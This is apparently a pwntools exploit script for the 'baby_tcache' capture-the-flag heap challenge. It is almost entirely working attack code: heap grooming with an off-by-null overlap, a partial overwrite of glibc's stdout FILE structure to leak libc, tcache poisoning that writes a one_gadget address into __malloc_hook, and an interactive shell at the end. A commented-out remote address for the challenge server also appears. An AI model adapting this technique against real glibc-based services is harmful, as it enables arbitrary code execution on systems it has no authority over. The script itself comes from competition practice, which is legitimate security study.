#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

context.arch ='amd64'
context.log_level = 'debug'

io = process('./baby_tcache')
#io = remote('52.68.236.186', 56746)

def menu(index,go=0):
    if go == 1:
        data= io.recvuntil('Your')
        return data
    io.recvuntil("ice: ")
    io.sendline(str(index))

def alloc(size,data):
    
    menu(1)
    io.recvuntil('Size:')
    io.sendline(str(size))
    io.recvuntil('Data:')
    io.send(data)

def delete(index):
    menu(2)
    io.recvuntil('Index:')
    io.sendline(str(index))

def dc(size,x):
    for i in range(x):
        alloc(size,'x')
    #alloc(0x10,'b')
    for i in range(x):
        delete(i)

if __name__ == '__main__':
    alloc(0x4f0,'0') #0
    alloc(0x230,"1") #1
    alloc(0x4f0,'2') #2
    alloc(0x4f0,'3') #3

    alloc(0x4f0, "4") #4
    alloc(0x330, "5") #5
    alloc(0x4f0, "6") #6
    alloc(0x4f0, "7") #7
    alloc(0x20,p64(0)*2 + p64(0)+p64(0x000000000001fc41)) #8

    delete(2)
    raw_input("1")
    alloc(0x4f8,'2'*0x4f0+p64(0xa40+0x200))  #2
    raw_input("2")
    delete(0)
    raw_input("3")
    delete(3)
    raw_input("4")

    #now free chunk is 0 nad 4, 1 ,2 ,3 are allocd.
    delete(1)  #0,1,3 freed
    alloc(0x4f0,'0') #0
    alloc(0xc30,'\x60\x57') #1
    alloc(0x230,'\x00')  #3
    
    alloc(0x230, p64(0xfbad3887)+p64(0)*3+"\x80\x57")  #9 there we can edit main_arena_top
    data = menu("0",go=1)
    if "\x80\x57" in data or "\x57\x80" in data:
        print "hit!"
        libc_base = u64(data[:6].ljust(8,"\x00"))
        libc = libc_base - 0x3ec780
        malloc_hook = libc + 0x3ebc30
        print hex(libc)
        one = libc + 0x10a38c
        raw_input("here") 
        delete(6)
        alloc(0x4f8, "2"*0x4f0 + p64(0xa40 + 0x200 + 0x100))
        delete(4)
        delete(7)
        delete(5)
        alloc(0x4f0, "0")
        alloc(0xd30, p64(malloc_hook))
        alloc(0x330,"\x00")
        delete(8)
        alloc(0x330,p64(one))
        io.interactive()
        
    else:
        exit()
